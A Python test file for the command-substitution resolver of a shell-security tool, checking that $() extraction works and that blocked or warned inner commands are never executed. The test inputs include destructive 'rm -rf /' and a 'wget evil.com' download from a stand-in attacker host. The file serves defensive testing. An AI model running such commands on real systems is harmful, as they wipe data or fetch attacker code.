"""Tests for command substitution resolver module."""

import subprocess
from unittest.mock import patch, MagicMock

import pytest

from aegish.resolver import (
    ResolutionEntry,
    resolve_substitutions,
    _extract_innermost_substitutions,
)


class TestExtractSubstitutions:
    """Tests for balanced-parenthesis $() extraction."""

    def test_simple_substitution(self):
        result = _extract_innermost_substitutions("echo $(whoami)")
        assert len(result) == 1
        assert result[0] == ("$(whoami)", "whoami")

    def test_multiple_substitutions(self):
        result = _extract_innermost_substitutions("$(cmd1) && $(cmd2)")
        assert len(result) == 2
        patterns = [r[0] for r in result]
        assert "$(cmd1)" in patterns
        assert "$(cmd2)" in patterns

    def test_nested_substitutions_innermost(self):
        """Nested $() only extracts the innermost."""
        result = _extract_innermost_substitutions("$(echo $(cat file))")
        assert len(result) == 1
        assert result[0] == ("$(cat file)", "cat file")

    def test_no_substitution(self):
        result = _extract_innermost_substitutions("echo hello")
        assert result == []

    def test_balanced_parens_in_command(self):
        """Handles parens inside the substitution correctly."""
        result = _extract_innermost_substitutions("$(echo (test))")
        assert len(result) == 1
        # Should capture up to the balanced closing paren
        assert result[0][1] == "echo (test)"

    def test_quoted_parens_not_counted(self):
        """Parens inside quotes don't affect balance."""
        result = _extract_innermost_substitutions("$(echo ')')")
        assert len(result) == 1
        assert result[0][1] == "echo ')'"

    def test_empty_substitution(self):
        result = _extract_innermost_substitutions("$()")
        assert len(result) == 1
        assert result[0] == ("$()", "")


class TestResolveSubstitutions:
    """Tests for the resolution pipeline."""

    def test_no_substitutions_passthrough(self):
        text, log = resolve_substitutions("echo hello")
        assert text == "echo hello"
        assert log == []

    def test_allowed_command_resolved(self):
        """ALLOW'd inner commands are executed and substituted."""
        mock_result = {"action": "allow", "reason": "Safe", "confidence": 0.9}
        mock_proc = MagicMock()
        mock_proc.stdout = "testuser\n"

        with patch("aegish.validator.validate_command", return_value=mock_result), \
             patch("aegish.executor.execute_for_resolution", return_value=mock_proc):
            text, log = resolve_substitutions("echo $(whoami)")

        assert text == "echo testuser"
        assert len(log) == 1
        assert log[0].status == "resolved"
        assert log[0].output == "testuser"

    def test_blocked_command_not_executed(self):
        """BLOCK'd inner commands are annotated, not executed."""
        mock_result = {"action": "block", "reason": "Dangerous", "confidence": 0.95}

        with patch("aegish.validator.validate_command", return_value=mock_result), \
             patch("aegish.executor.execute_for_resolution") as mock_exec:
            text, log = resolve_substitutions("echo $(rm -rf /)")

        mock_exec.assert_not_called()
        assert len(log) == 1
        assert log[0].status == "blocked"
        assert "$(rm -rf /)" in text  # Not substituted

    def test_warned_command_not_executed(self):
        """WARN'd inner commands are annotated, not executed."""
        mock_result = {"action": "warn", "reason": "Risky", "confidence": 0.7}

        with patch("aegish.validator.validate_command", return_value=mock_result), \
             patch("aegish.executor.execute_for_resolution") as mock_exec:
            text, log = resolve_substitutions("echo $(wget evil.com)")

        mock_exec.assert_not_called()
        assert len(log) == 1
        assert log[0].status == "warned"

    def test_depth_limit_exceeded(self):
        """Commands at max depth are annotated, not resolved."""
        text, log = resolve_substitutions(
            "echo $(whoami)", depth=2, max_depth=2,
        )
        assert len(log) == 1
        assert log[0].status == "depth_exceeded"
        assert "$(whoami)" in text  # Not substituted

    def test_execution_error_annotated(self):
        """Execution errors are captured in the log."""
        mock_result = {"action": "allow", "reason": "Safe", "confidence": 0.9}

        with patch("aegish.validator.validate_command", return_value=mock_result), \
             patch("aegish.executor.execute_for_resolution",
                   side_effect=subprocess.TimeoutExpired("cmd", 3)):
            text, log = resolve_substitutions("echo $(slow_cmd)")

        assert len(log) == 1
        assert log[0].status == "error"
        assert "Execution error" in log[0].reason

    def test_validation_error_annotated(self):
        """Validation errors are captured in the log."""
        with patch("aegish.validator.validate_command",
                   side_effect=RuntimeError("boom")):
            text, log = resolve_substitutions("echo $(cmd)")

        assert len(log) == 1
        assert log[0].status == "error"
        assert "Validation error" in log[0].reason


class TestResolutionEntry:
    """Tests for ResolutionEntry dataclass."""

    def test_resolved_entry(self):
        entry = ResolutionEntry(
            pattern="$(whoami)",
            inner_command="whoami",
            status="resolved",
            output="root",
            reason=None,
        )
        assert entry.status == "resolved"
        assert entry.output == "root"

    def test_blocked_entry(self):
        entry = ResolutionEntry(
            pattern="$(rm -rf /)",
            inner_command="rm -rf /",
            status="blocked",
            output=None,
            reason="Destructive command",
        )
        assert entry.status == "blocked"
        assert entry.output is None
